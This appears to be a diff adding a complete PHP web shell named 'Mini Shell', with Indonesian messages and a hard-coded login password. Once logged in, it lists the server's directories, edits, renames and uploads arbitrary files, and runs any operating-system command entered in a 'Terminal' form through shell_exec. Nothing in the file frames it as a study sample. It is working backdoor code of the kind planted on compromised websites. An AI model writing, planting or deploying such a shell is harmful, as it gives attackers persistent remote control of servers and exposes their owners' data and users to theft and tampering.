@@ -1,0 +1,80 @@
+<?php
+session_start();
+$p = 'matitanam';
+function e($s) { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }
+if (!isset($_SESSION['l'])) {
+    if (isset($_POST['p']) && $_POST['p'] === $p) $_SESSION['l'] = 1;
+    else { echo '<form method="post"><input type="password" name="p" placeholder="Password" autofocus><button>Login</button></form>'; exit; }
+}
+if (isset($_GET['logout'])) { session_destroy(); header("Location: ?"); exit; }
+$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
+if (!$path) die("Path tidak ditemukan.");
+
+if (isset($_FILES['f'])) {
+    $err = $_FILES['f']['error'];
+    if ($err === 0) {
+        $t = $path . '/' . basename($_FILES['f']['name']);
+        if (move_uploaded_file($_FILES['f']['tmp_name'], $t)) {
+            clearstatcache(true, $t);
+            if (filesize($t) > 0) echo "Upload sukses: " . e(basename($t)) . "<br>";
+            else { unlink($t); echo "Upload gagal: file kosong.<br>"; }
+        } else echo "Upload gagal: gagal memindahkan file.<br>";
+    } else {
+        $msg = [
+            1 => "File melebihi batas server.",
+            2 => "File terlalu besar.",
+            3 => "Terupload sebagian.",
+            4 => "Tidak ada file.",
+            6 => "Tmp folder hilang.",
+            7 => "Gagal menulis ke disk.",
+            8 => "Dihentikan ekstensi.",
+        ];
+        echo "Upload gagal: " . ($msg[$err] ?? "Error tidak diketahui.") . "<br>";
+    }
+}
+
+if (isset($_POST['editfile'], $_POST['content'])) {
+    $f = realpath($_POST['editfile']);
+    if ($f && file_exists($f)) {
+        file_put_contents($f, $_POST['content']);
+        echo "File disimpan.<br>";
+    } else echo "File tidak ditemukan.<br>";
+}
+
+if (isset($_POST['rename_old'], $_POST['rename_new'])) {
+    $o = realpath($_POST['rename_old']);
+    $n = dirname($o) . '/' . basename($_POST['rename_new']);
+    if ($o && file_exists($o)) {
+        if (rename($o, $n)) echo "Rename sukses: " . e(basename($o)) . " → " . e(basename($n)) . "<br>";
+        else echo "Rename gagal.<br>";
+    } else echo "File/folder tidak ditemukan.<br>";
+}
+
+$out = '';
+if (isset($_POST['terminal_cmd'])) {
+    $out = function_exists('shell_exec') ? shell_exec($_POST['terminal_cmd'].' 2>&1') : "shell_exec() tidak aktif.";
+}
+
+echo "<h3>Mini Shell</h3><a href='?logout=1'>Logout</a><br><b>Path:</b> " . e($path) . "<hr>";
+$p = dirname($path);
+if ($p !== $path) echo "<a href='?path=" . urlencode($p) . "'>[..]</a><br><br>";
+
+foreach (scandir($path) as $i) {
+    if ($i === '.') continue;
+    $f = $path . '/' . $i;
+    echo (is_dir($f) ? "[DIR] <a href='?path=" . urlencode($f) . "'>" : "[FILE] ") . e($i) . (is_file($f) ? " <a href='?path=" . urlencode($path) . "&edit=" . urlencode($f) . "'>edit</a>" : '') .
+    "<form method='post' style='display:inline'><input type='hidden' name='rename_old' value='" . e($f) . "'><input type='text' name='rename_new' placeholder='New name'><button>Rename</button></form><br>";
+}
+
+if (isset($_GET['edit'])) {
+    $f = $_GET['edit'];
+    if (file_exists($f) && is_file($f)) {
+        $c = file_get_contents($f);
+        echo "<hr><h4>Edit: " . e($f) . "</h4><form method='post'><input type='hidden' name='editfile' value='" . e($f) . "'><textarea name='content' rows='20' cols='80'>" . e($c) . "</textarea><br><button>Simpan</button></form><hr>";
+    } else echo "File tidak ditemukan.<br>";
+}
+
+echo "<hr><form method='post' enctype='multipart/form-data'>Upload: <input type='file' name='f' required><button>Upload</button></form><hr>";
+echo "<h4>Terminal</h4><form method='post'><input type='text' name='terminal_cmd' placeholder='command' style='width:400px;' required autofocus><button>Run</button></form>";
+if ($out) echo "<pre>" . e($out) . "</pre>";
+?>
